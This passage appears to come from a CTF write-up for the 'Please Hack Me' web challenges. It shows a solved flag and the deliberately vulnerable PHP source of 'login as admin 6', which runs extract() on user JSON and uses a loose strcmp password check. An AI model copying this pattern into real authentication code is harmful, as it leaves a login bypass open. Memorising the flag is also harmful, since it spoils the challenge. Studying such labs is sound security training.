</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-success&#34;</span>&gt;&lt;<span style=color:#ff6ac1>code</span>&gt;FLAG{Remember add exit after redirection..}&lt;/<span style=color:#ff6ac1>code</span>&gt;&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40</span><span>&lt;/<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41</span><span>&lt;/<span style=color:#ff6ac1>html</span>&gt;
</span></span></code></pre></div><p>Flag <code>FLAG{Remember add exit after redirection..}</code></p><hr><h2 class="relative group">27. <a href=https://ctf.hackme.quest/login6 target=_blank>login as admin 6</a><div id=27-login-as-admin-6httpsctfhackmequestlogin6 class=anchor></div><span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#27-login-as-admin-6httpsctfhackmequestlogin6 aria-label=定位點>#</a></span></h2><blockquote><p>login as admin</p></blockquote><p>Source code:</p><div class=highlight><pre tabindex=0 style=color:#e2e4e5;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-phtml data-lang=phtml><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  1</span><span><span style=color:#78787e>&lt;?php</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  2</span><span><span style=color:#ff6ac1>@</span>error_reporting(<span style=color:#ff6ac1>E_ALL</span><span style=color:#ff6ac1>^</span>E_NOTICE);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  3</span><span><span style=color:#ff6ac1>require</span>(<span style=color:#5af78e>&#39;config.php&#39;</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  4</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  5</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$_GET</span>[<span style=color:#5af78e>&#39;show_source&#39;</span>] <span style=color:#ff6ac1>===</span> <span style=color:#5af78e>&#39;1&#39;</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  6</span><span>    highlight_file(<span style=color:#ff9f43>__FILE__</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  7</span><span>    <span style=color:#ff6ac1>exit</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  8</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">  9</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 10</span><span><span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>null</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 11</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 12</span><span><span style=color:#78787e>// connect to database
</span></span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 13</span><span><span style=color:#78787e></span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 14</span><span><span style=color:#ff6ac1>if</span>(<span style=color:#ff6ac1>!</span><span style=color:#ff6ac1>empty</span>(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;data&#39;</span>])) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 15</span><span>    <span style=color:#ff6ac1>try</span> {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 16</span><span>        <span style=color:#ff5c57>$data</span> <span style=color:#ff6ac1>=</span> json_decode(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;data&#39;</span>], <span style=color:#ff6ac1>true</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 17</span><span>    } <span style=color:#ff6ac1>catch</span> (Exception <span style=color:#ff5c57>$e</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 18</span><span>        <span style=color:#ff5c57>$data</span> <span style=color:#ff6ac1>=</span> [];
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 19</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 20</span><span>    extract(<span style=color:#ff5c57>$data</span>);
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 21</span><span>    <span style=color:#ff6ac1>if</span>(<span style=color:#ff5c57>$users</span>[<span style=color:#ff5c57>$username</span>] <span style=color:#ff6ac1>&amp;&amp;</span> strcmp(<span style=color:#ff5c57>$users</span>[<span style=color:#ff5c57>$username</span>], <span style=color:#ff5c57>$password</span>) <span style=color:#ff6ac1>==</span> <span style=color:#ff9f43>0</span>) {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 22</span><span>        <span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>$username</span>;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 23</span><span>    }
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 24</span><span>}
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 25</span><span><span style=color:#78787e>?&gt;&lt;!DOCTYPE html&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 26</span><span>&lt;<span style=color:#ff6ac1>html</span> <span style=color:#57c7ff>lang</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;en&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 27</span><span>&lt;<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 28</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>charset</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;UTF-8&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 29</span><span>    &lt;<span style=color:#ff6ac1>title</span>&gt;Login As Admin 6&lt;/<span style=color:#ff6ac1>title</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 30</span><span>    &lt;<span style=color:#ff6ac1>meta</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;viewport&#34;</span> <span style=color:#57c7ff>content</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;width=device-width, initial-scale=1&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 31</span><span>    &lt;<span style=color:#ff6ac1>link</span> <span style=color:#57c7ff>rel</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;stylesheet&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/bootstrap/css/bootstrap.min.css&#34;</span> <span style=color:#57c7ff>media</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;all&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 32</span><span>&lt;/<span style=color:#ff6ac1>head</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 33</span><span>&lt;<span style=color:#ff6ac1>body</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 34</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;jumbotron&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 35</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 36</span><span>            &lt;<span style=color:#ff6ac1>h1</span>&gt;Login as Admin 6&lt;/<span style=color:#ff6ac1>h1</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 37</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 38</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 39</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 40</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 41</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 42</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container-fluid&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 43</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-header&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 44</span><span>                    &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;navbar-brand&#34;</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/&#34;</span>&gt;Please Hack Me&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 45</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 46</span><span>                &lt;<span style=color:#ff6ac1>ul</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;nav navbar-nav&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 47</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 48</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;/scoreboard&#34;</span>&gt;Scoreboard&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 49</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 50</span><span>                    &lt;<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 51</span><span>                        &lt;<span style=color:#ff6ac1>a</span> <span style=color:#57c7ff>href</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;?show_source=1&#34;</span> <span style=color:#57c7ff>target</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;_blank&#34;</span>&gt;Source Code&lt;/<span style=color:#ff6ac1>a</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 52</span><span>                    &lt;/<span style=color:#ff6ac1>li</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 53</span><span>                &lt;/<span style=color:#ff6ac1>ul</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 54</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 55</span><span>        &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 56</span><span>    &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 57</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 58</span><span>    &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;container&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 59</span><span>        &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;col-md-6 col-md-offset-3&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 60</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff6ac1>!</span><span style=color:#ff5c57>$user</span> <span style=color:#ff6ac1>&amp;&amp;</span> isset(<span style=color:#ff5c57>$_POST</span>[<span style=color:#5af78e>&#39;data&#39;</span>]))<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 61</span><span>            &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;alert alert-danger&#34;</span>&gt;Login failed&lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 62</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>endif</span>; <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 63</span><span><span style=color:#78787e>&lt;?php</span> <span style=color:#ff6ac1>if</span>(<span style=color:#ff6ac1>!</span><span style=color:#ff5c57>$user</span>)<span style=color:#ff6ac1>:</span> <span style=color:#78787e>?&gt;</span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 64</span><span>            &lt;<span style=color:#ff6ac1>form</span> <span style=color:#57c7ff>action</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;.&#34;</span> <span style=color:#57c7ff>method</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;POST&#34;</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form_login&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 65</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 66</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;username&#34;</span>&gt;User:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 67</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;username&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;name&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;User&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 68</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 69</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 70</span><span>                    &lt;<span style=color:#ff6ac1>label</span> <span style=color:#57c7ff>for</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span>&gt;Pass:&lt;/<span style=color:#ff6ac1>label</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 71</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;text&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;password&#34;</span> <span style=color:#57c7ff>placeholder</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Password&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 72</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 73</span><span>                &lt;<span style=color:#ff6ac1>div</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-group&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 74</span><span>                    &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>class</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;form-control btn btn-primary&#34;</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;submit&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;Login&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 75</span><span>                &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 76</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 77</span><span>                &lt;<span style=color:#ff6ac1>input</span> <span style=color:#57c7ff>type</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;hidden&#34;</span> <span style=color:#57c7ff>name</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;data&#34;</span> <span style=color:#57c7ff>id</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;login_data&#34;</span> <span style=color:#57c7ff>value</span><span style=color:#ff6ac1>=</span><span style=color:#5af78e>&#34;{}&#34;</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 78</span><span>            &lt;/<span style=color:#ff6ac1>form</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 79</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 80</span><span>            &lt;<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 81</span><span>                &lt;<span style=color:#ff6ac1>p</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 82</span><span>                    You can login with &lt;<span style=color:#ff6ac1>code</span>&gt;guest&lt;/<span style=color:#ff6ac1>code</span>&gt; / &lt;<span style=color:#ff6ac1>code</span>&gt;guest&lt;/<span style=color:#ff6ac1>code</span>&gt;.
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 83</span><span>                &lt;/<span style=color:#ff6ac1>p</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 84</span><span>            &lt;/<span style=color:#ff6ac1>div</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 85</span><span>
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 86</span><span>            &lt;<span style=color:#ff6ac1>script</span>&gt;
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 87</span><span>            form_login.onsubmit <span style=color:#ff6ac1>=</span> <span style=color:#ff5c57>function</span> () {
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 88</span><span>                login_data.value <span style=color:#ff6ac1>=</span> JSON.stringify({
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 89</span><span>                    username<span style=color:#ff6ac1>:</span> username.value,
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 90</span><span>                    password<span style=color:#ff6ac1>:</span> password.value
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 91</span><span>                });
</span></span><span style=display:flex><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 92</span><span>                username.value <span style=color:#ff6ac1>=</span> <span style=color:#ff6ac1>null</span>;
